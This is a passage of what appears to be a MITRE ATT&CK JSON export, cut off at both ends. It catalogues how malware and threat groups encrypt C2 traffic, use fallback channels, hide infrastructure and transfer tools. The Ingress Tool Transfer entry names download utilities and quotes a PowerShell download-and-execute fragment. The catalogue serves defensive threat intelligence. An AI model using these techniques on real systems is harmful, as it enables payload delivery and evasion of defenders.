{"id": "S1051", "name": "KEYPLUG", "description": "KEYPLUG can use TLS-encrypted WebSocket Protocol (WSS) for C2."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can use SSL and TLS for communications."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos's authentication and key exchange is performed using RSA-512."}, {"id": "S1121", "name": "LITTLELAMB.WOOLTEA", "description": "LITTLELAMB.WOOLTEA can communicate over SSL using the private key from the Ivanti Connect Secure web server."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb can send short C2 commands, up to 512 bytes, encrypted with RSA-4096."}, {"id": "S0409", "name": "Machete", "description": "Machete has used TLS-encrypted FTP to exfiltrate data."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo's C2 communication has been encrypted using OpenSSL."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu contains a copy of the OpenSSL library to encrypt C2 traffic."}, {"id": "S0699", "name": "Mythic", "description": "Mythic supports SSL encrypted C2."}, {"id": "G0049", "name": "OilRig", "description": "OilRig used the Plink utility and other tools to create tunnels to C2 servers."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors' proxy implementation \"Agent\" upgraded the socket in use to a TLS socket."}, {"id": "S0556", "name": "Pay2Key", "description": "Pay2Key has used RSA encrypted communications with C2."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman."}, {"id": "S1123", "name": "PITSTOP", "description": "PITSTOP has the ability to communicate over TLS."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT used TLS to encrypt command and control (C2) communications."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY encrypts C2 traffic with AES and RSA."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has encrypted C2 traffic with RSA."}, {"id": "S0192", "name": "Pupy", "description": "Pupy's default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used HTTPS for C2 communication."}, {"id": "S0496", "name": "REvil", "description": "REvil has encrypted C2 communications with the ECIES algorithm."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun variants can use SSL for encrypting C2 communications."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic has the ability to send a random 64-byte RC4 key to communicate with actor-controlled C2 servers by using an RSA public key."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper may set up a reverse SSH tunnel to give the attacker access to services running on the victim, such as RDP."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can use mutual TLS and RSA  cryptography to exchange a session key."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve can use SSL/TLS for its HTTPS Telegram Bot API-based C2 channel."}, {"id": "S0627", "name": "SodaMaster", "description": "SodaMaster can use a hardcoded RSA key to encrypt some of its C2 traffic."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can SSL encrypt C2 traffic."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has encrypted C2 traffic using SSL/TLS."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot uses SSL for encrypting C2 communications."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used TLS encrypted C2 communications including for campaigns using AsyncRAT."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla has the ability to encrypt C2 traffic with SSL/TLS."}, {"id": "S0183", "name": "Tor", "description": "Tor encapsulates traffic in multiple layers of encryption, using TLS by default."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can secure C2 communications with SSL and TLS."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used SSL to connect to C2 servers."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has used a combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) to encrypt its top layer of C2 communications."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation used HTTPS for command and control of compromised Versa Director servers."}, {"id": "S0180", "name": "Volgmer", "description": "Some Volgmer variants use SSL to encrypt C2 communications."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry uses Tor for command and control traffic and routes a custom cryptographic protocol over the Tor circuit."}, {"id": "S0515", "name": "WellMail", "description": "WellMail can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS."}, {"id": "S0514", "name": "WellMess", "description": "WellMess can communicate to C2 with mutual TLS where client and server mutually check certificates."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can use RSA-4096 to encrypt data sent to its C2 server."}, {"id": "S0117", "name": "XTunnel", "description": "XTunnel uses SSL/TLS and RC4 to encrypt traffic."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy uses SSL and AES ECB for encrypting C2 communications."}]}]}, {"name": "Fallback Channels", "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.", "detailed_description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.", "id": "T1008", "examples": [{"id": "S0504", "name": "Anchor", "description": "Anchor can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can use a second channel for C2 when the primary channel is in upload mode."}, {"id": "G0096", "name": "APT41", "description": "APT41 used the Steam community page as a fallback mechanism for C2."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has the ability to use an alternative C2 server if the primary server fails."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT malware contains a secondary fallback command and control server that is contacted after the primary command and control server."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has the capability to communicate over a backup channel via plus.google.com."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can use backup C2 servers if the primary server fails."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can communicate over multiple C2 host and port combinations."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can change its C2 channel once every 360 loops by retrieving a new domain from the actors\u2019 S3 bucket."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK can switch to a new C2 channel if the current one is broken."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has used a hardcoded GitHub repository as a fallback channel."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi uses a backup communication method with an HTTP beacon."}, {"id": "S0062", "name": "DustySky", "description": "DustySky has two hard-coded domains for C2 servers; if the first does not respond, it will try the second."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux can attempt to find a new C2 server if it receives an error."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke has used several C2 servers per targeted organization."}, {"id": "G0046", "name": "FIN7", "description": "FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can use multiple domains and protocols in C2."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has multiple C2 channels in place in case one fails."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has been configured with several servers available for alternate C2 communications."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar can accept multiple URLs for C2 servers."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can assign hard-coded fallback domains for C2."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs uses a large list of C2 servers that it cycles through until a successful connection is established."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again."}, {"id": "S0211", "name": "Linfo", "description": "Linfo creates a backdoor through which remote attackers can change C2 servers."}, {"id": "S0409", "name": "Machete", "description": "Machete has sent data over HTTP if FTP failed, and has also used a fallback server."}, {"id": "S0051", "name": "MiniDuke", "description": "MiniDuke uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server."}, {"id": "S0699", "name": "Mythic", "description": "Mythic can use a list of C2 URLs as fallback mechanisms in case one IP or domain gets blocked."}, {"id": "S0034", "name": "NETEAGLE", "description": "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used company extranet servers as secondary C2 servers."}, {"id": "G0049", "name": "OilRig", "description": "OilRig malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can switch to an alternate C2 domain when a particular date has been reached."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful."}, {"id": "S1084", "name": "QUIETEXIT", "description": "QUIETEXIT can attempt to connect to a second hard-coded C2 if the first hard-coded C2 address fails."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay has the ability to switch between TCP and HTTP for C2 if one method is not working."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has used HTTP if DNS C2 communications were not functioning."}, {"id": "S0085", "name": "S-Type", "description": "S-Type primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails."}, {"id": "S1019", "name": "Shark", "description": "Shark can update its configuration to use a different C2 server."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has used a secondary C2 location if the first was unavailable."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist has primarily used port 443 for C2 but can use port 80 as a fallback."}, {"id": "S0058", "name": "SslMM", "description": "SslMM has a hard-coded primary and backup C2 string."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet has the ability to generate new C2 domains."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails, it will wait 60 seconds and then try another IP address."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla can go through a list of C2 server IPs and will try to register with each until one responds."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can use up to 10 channels to communicate between implants."}, {"id": "S0476", "name": "Valak", "description": "Valak can communicate over multiple C2 hosts."}, {"id": "S0059", "name": "WinMM", "description": "WinMM is usually configured with primary and backup domains for C2 communications."}, {"id": "S0117", "name": "XTunnel", "description": "The C2 server used by XTunnel provides a port number to the victim to use as a fallback in case the connection closes on the currently used port."}], "sub_techniques": []}, {"name": "Hide Infrastructure", "description": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools, masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers, and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.", "detailed_description": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools, masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers, and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.\nC2 networks may include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.\nAdversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents. Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., Virtualization/Sandbox Evasion).\nHiding C2 infrastructure may also be supported by Resource Development activities such as Acquire Infrastructure and Compromise Infrastructure. For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.", "id": "T1665", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 uses compromised residential endpoints, typically within the same ISP IP address range, as proxies to hide the true source of C2 traffic."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate command and control includes hard-coded domains in the malware masquerading as legitimate services such as Akamai CDN or Amazon Web Services."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure."}], "sub_techniques": []}, {"name": "Ingress Tool Transfer", "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer).", "detailed_description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer).\nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "id": "T1105", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. "}, {"id": "S0469", "name": "ABK", "description": "ABK has the ability to download files from C2."}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT has the ability to download additional payloads onto an infected machine."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can download additional files for execution on the victim\u2019s machine."}, {"id": "S0092", "name": "Agent.btz", "description": "Agent.btz attempts to download an encrypted binary from a specified domain."}, {"id": "G0130", "name": "Ajax Security Team", "description": "Ajax Security Team has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system."}, {"id": "S1025", "name": "Amadey", "description": "Amadey can download and execute files to further infect a host machine with additional malware."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can download additional payloads."}, {"id": "G0138", "name": "Andariel", "description": "Andariel has downloaded additional tools and malware onto compromised hosts."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA can download additional payloads from C2."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has downloaded binary data from a specified domain after the malicious document is opened."}, {"id": "G0026", "name": "APT18", "description": "APT18 can upload a file to the victim\u2019s machine."}, {"id": "G0007", "name": "APT28", "description": "APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant."}, {"id": "G0016", "name": "APT29", "description": "APT29 has downloaded additional tools and malware onto compromised networks."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can copy files to remote machines."}, {"id": "G0050", "name": "APT32", "description": "APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors."}, {"id": "G0064", "name": "APT33", "description": "APT33 has downloaded additional files and programs from its C2 server."}, {"id": "G0067", "name": "APT37", "description": "APT37 has downloaded second stage malware from compromised websites."}, {"id": "G0082", "name": "APT38", "description": "APT38 used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim\u2019s machine."}, {"id": "G0087", "name": "APT39", "description": "APT39 has downloaded tools to compromised hosts."}, {"id": "G0096", "name": "APT41", "description": "APT41 used certutil to download additional files. APT41 downloaded post-exploitation tools such as Cobalt Strike via command shell following initial access. APT41 has uploaded Procdump   and NATBypass to a staging directory and has used these tools in follow-on activities."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST involved execution of certutil.exe via web shell to download the DUSTPAN dropper."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has downloaded additional malware onto compromised hosts."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to download additional payloads from C2."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth uses certutil and BITSAdmin to download additional malware. "}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT has the ability to download files over SFTP."}, {"id": "S0438", "name": "Attor", "description": "Attor can download additional plugins, updates and other files. "}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred can download files and additional malware."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to download files from C2 to a compromised host."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can download and execute additional files. Azorult has also downloaded a ransomware payload called Hermes."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has downloaded additional files from the C2."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig can download and execute additional payloads on a compromised host."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea can download additional modules from C2."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has downloaded additional files and tools onto a compromised host."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has download files from its C2 server."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH has the ability to load a second stage malicious DLL file onto a compromised machine."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS is capable of downloading additional files through C2 channels, including a new version of itself."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch can download and execute or update malware."}, {"id": "S0234", "name": "Bandook", "description": "Bandook can download files to the system."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot uploads files and secondary payloads to the victim's machine."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can download and deploy additional payloads, including ransomware and post-exploitation frameworks such as Cobalt Strike."}, {"id": "S0470", "name": "BBK", "description": "BBK has the ability to download files from C2 to the infected host."}, {"id": "S0574", "name": "BendyBear", "description": "BendyBear is designed to download an implant from a C2 server."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT has a command to download a file from the C2 server."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has the capability to download files to execute on the victim\u2019s machine."}, {"id": "S0190", "name": "BITSAdmin", "description": "BITSAdmin can be used to create BITS Jobs to upload and/or download files."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has downloaded additional malware and tools onto a compromised host."}, {"id": "S0564", "name": "BlackMould", "description": "BlackMould has the ability to download files to the victim's machine."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has downloaded files to a victim machine."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can download additional files onto the host."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan can download additional modules from the C2 server."}, {"id": "S0360", "name": "BONDUPDATER", "description": "BONDUPDATER can download or upload files from its C2 server."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox has the ability to download next stage malware components to a compromised system."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon can download files."}, {"id": "S0204", "name": "Briba", "description": "Briba downloads files onto infected hosts."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget)."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can download files to compromised hosts."}, {"id": "S0471", "name": "build_downer", "description": "build_downer has the ability to download files from C2 to the infected host."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can download and execute additional payloads including through the use of a Dex command."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore can download and execute new versions of itself."}, {"id": "S1118", "name": "BUSHWALK", "description": "BUSHWALK can write malicious payloads sent through a web request\u2019s command parameter."}, {"id": "C0010", "name": "C0010", "description": "During C0010, UNC3890 actors downloaded tools and malware onto a compromised host."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors downloaded additional tools and files onto a compromised network."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 downloaded malicious payloads onto compromised systems."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors downloaded additional tools, such as Mimikatz and Sliver, as well as Cobalt Strike and AvosLocker ransomware onto the victim network."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors downloaded additional tools and files onto victim machines."}, {"id": "C0026", "name": "C0026", "description": "During C0026, the threat actors downloaded malicious payloads onto select compromised hosts."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider downloaded tools using victim organization systems."}, {"id": "S0274", "name": "Calisto", "description": "Calisto has the capability to upload and download files to the victim's machine."}, {"id": "S0077", "name": "CallMe", "description": "CallMe has the capability to download a file to the victim from the C2 server."}, {"id": "S0351", "name": "Cannon", "description": "Cannon can download a payload for execution."}, {"id": "S0484", "name": "Carberp", "description": "Carberp can download and execute new plugins from the C2 server. "}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can download and execute additional payloads."}, {"id": "S0465", "name": "CARROTBALL", "description": "CARROTBALL has the ability to download and install a remote payload."}, {"id": "S0462", "name": "CARROTBAT", "description": "CARROTBAT has the ability to download and execute a remote file via certutil."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell has a module to download and upload files to the system."}, {"id": "S0160", "name": "certutil", "description": "certutil can be used to download files from a given URL."}, {"id": "S0631", "name": "Chaes", "description": "Chaes can download additional files onto an infected machine."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower has the ability to download additional modules to a compromised host."}, {"id": "S0144", "name": "ChChes", "description": "ChChes is capable of downloading files, including additional modules."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has remotely copied tools and malware onto targeted systems."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can download additional files from C2."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component can download remote files."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK is capable of performing remote file transmission."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can download its code from C2."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has downloaded files, including Cobalt Strike, to compromised hosts."}, {"id": "S0054", "name": "CloudDuke", "description": "CloudDuke downloads and executes additional malware from either a Web address or a Microsoft OneDrive account."}, {"id": "S0106", "name": "cmd", "description": "cmd can be used to copy files to/from a remotely connected external system."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers. The group's JavaScript backdoor is also capable of downloading files."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can deliver additional payloads to victim machines."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker executes a Python script to download its second stage."}, {"id": "S0608", "name": "Conficker", "description": "Conficker downloads an HTTP server to the infected machine."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has downloaded additional files and payloads onto a compromised host following initial access."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner can download additional scripts from a web server."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL downloads another dropper from its C2 server."}, {"id": "S0614", "name": "CostaBricks", "description": "CostaBricks has been used to load SombRAT onto a compromised host."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors downloaded malware and tools onto a compromised host."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can download files to the compromised host."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a command to retrieve files from its C2 server."}, {"id": "S0498", "name": "Cryptoistic", "description": "Cryptoistic has the ability to send and receive files."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can download additional tools to a compromised host."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can download files from its C2 server."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors leveraged exploits to download remote files to Ivanti Connect Secure VPNs."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has the ability to download files to target systems."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can download its payload from a C2 server."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has used PowerShell and BITSAdmin to retrieve follow-on payloads from external locations for execution on victim machines."}, {"id": "S1014", "name": "DanBot", "description": "DanBot can download additional files to a targeted system."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can load any files onto the infected machine to execute."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate retrieves cryptocurrency mining payloads and commands in encrypted traffic from its command and control server. DarkGate uses Windows Batch scripts executing the curl command to retrieve follow-on payloads."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used first-stage payloads that download additional malware from C2 servers."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can download additional packages for keylogging, cryptocurrency mining, and other capabilities; it can also retrieve malicious payloads such as Agent Tesla, AsyncRat, NanoCore, RedLine, Cobalt Strike, and Metasploit."}, {"id": "S0187", "name": "Daserf", "description": "Daserf can download remote files."}, {"id": "S0255", "name": "DDKONG", "description": "DDKONG downloads and uploads files on the victim\u2019s machine."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "DEATHRANSOM can download files to a compromised host."}, {"id": "S0354", "name": "Denis", "description": "Denis deploys additional backdoors and hacking tools to the system."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can receive configuration updates and additional payloads including wscpy.exe from C2."}, {"id": "S0200", "name": "Dipsind", "description": "Dipsind can download remote files."}, {"id": "S1088", "name": "Disco", "description": "Disco can download files to targeted systems via SMB."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem can download files to compromised systems after receiving a command with the string downloaddd."}, {"id": "S0213", "name": "DOGCALL", "description": "DOGCALL can download and execute additional payloads."}, {"id": "S0600", "name": "Doki", "description": "Doki has downloaded scripts from C2."}, {"id": "S0695", "name": "Donut", "description": "Donut can download and execute previously staged shellcode payloads."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to download files to the compromised host."}, {"id": "S0134", "name": "Downdelph", "description": "After downloading its main config file, Downdelph downloads multiple payloads from C2 servers."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has copied and installed tools for operations once in the victim environment."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can deploy additional tools onto an infected machine."}, {"id": "S0547", "name": "DropBook", "description": "DropBook can download and execute additional files."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub can download files to a compromised host."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack\u2019s can download and upload a file to the victim\u2019s computer."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can retrieve and load additional payloads."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has a command to download and executes additional files."}, {"id": "S0624", "name": "Ecipekac", "description": "Ecipekac can download additional payloads to a compromised host."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has the ability to download files from its C2 server."}, {"id": "G0066", "name": "Elderwood", "description": "The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location."}, {"id": "S0081", "name": "Elise", "description": "Elise can download additional files from the C2 server for execution."}, {"id": "S0082", "name": "Emissary", "description": "Emissary has the capability to download files from the C2 server."}, {"id": "S0363", "name": "Empire", "description": "Empire can upload and download to and from a victim machine."}, {"id": "S0404", "name": "esentutl", "description": "esentutl can be used to copy files from a given URL."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has downloaded additional Lua scripts from the C2."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can download and upload files to the victim's computer."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum can deploy additional components or tools as needed."}, {"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux has a command to download a file from  and to a remote C2 server."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has a function to download a file to the infected system."}, {"id": "S0171", "name": "Felismus", "description": "Felismus can download files from remote servers."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT downloads and uploads files to and from the victim\u2019s machine."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has downloaded additional tools and malware to compromised systems."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used remote code execution to download subsequent payloads."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro can download additional malware from the C2 server."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can transfer files from C2."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has downloaded additional tools including PsExec directly to endpoints."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors downloaded files and tools 